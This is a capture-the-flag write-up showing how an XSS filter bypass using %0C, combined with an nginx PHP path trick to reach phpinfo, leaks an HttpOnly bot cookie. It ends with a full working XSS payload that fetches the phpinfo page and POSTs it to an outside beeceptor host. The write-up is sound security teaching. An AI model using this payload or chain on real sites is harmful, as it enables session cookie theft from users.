## Description 
  Just to warm you up for the next Fight :"D
## Walkthrough:
  **the challenges was provided with a src code
  the src code is made of 4 main files 
  1- index.php 
  2- info.php
  3- bot.js
  4- nginx.conf**

  **Flag is in the bot.js cookie with a httponly attribute this mean that JS cannot access the cookie**

  **1-index.php**
  ![image](https://github.com/user-attachments/assets/7d144810-397a-4ae2-91f0-b63c47938092)

  **so it is clear that we can get xss from the name get parameter but how ?**

  **the main problem is in the Enhanced_Trim function that replace the defined char set with "" so how to bypass it to make an alert?**

  **at first i looked for alternatives for the space and found that %0C can work so the payload to make a simple alert -> <img%0Csrc=x%0Conerror=alert``>**

  **but this dosenot have any value since we cannot use JS to steal the cookie bc the httponly attribute on the cookie**

  **the solution was in the info.php that view the phpinfo**

  ![image](https://github.com/user-attachments/assets/b0ad6b6d-cf28-4f41-9bf4-313659f4ac4c)

  **so how we can use phpinfo to get the bot cookie?**
  ![phpinfo-dvwa-1](https://github.com/user-attachments/assets/fbce6706-e779-43e4-be72-60b4c27ef1cd)

  **when a user vist the phpinfo page it reflect its cookie in response even the HttpOnly ones like this**



  **so now we can make the bot visit the info.php page then take the response and send it to our server right ? no it will not work bc the nginx.conf lets look at it**

  ![image](https://github.com/user-attachments/assets/e8283328-e2fa-4412-947c-aa0eddddba59)

  **so in the nginx.conf it says that the info.php is only accessible from the localhost (the bot dosent see the localhost of the challange so it cannot access it)**

  **that soloution was in the last part of the configuration that include and run any file endwith .php so we can it to access the info.php right ?**

  **i found this on hacktricks that made me able to bypass the validation and accss the info.php (https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#php-fpm)**

  **so now we cann access the info.php like this -> /info.php/index.php**

  ![image](https://github.com/user-attachments/assets/a822c94b-027c-498d-92de-f019cbc9e6e4)

  **so now we can make the bot vist the /info.php/index.php and get the response and send it to our server**

  ```
  payload ->
  <img%0Csrc=x%0Conerror='fetch("info.php%252Findex.php")%0C.then(response%0C=>%0Cresponse.text())%0C.
then(data%0C=>%0Cfetch("https://qlashx.free.beeceptor.com/",%0C{method:"POST",%0Cheaders:{%0C"Content-Type":"application/x-www-form-urlencoded"},%0Cbody:"data="%0C%2BencodeURIComponent(data)})%0C)'> 
  ```
`flag -> idek{Ghazy_N3gm_Elbalad} `



  
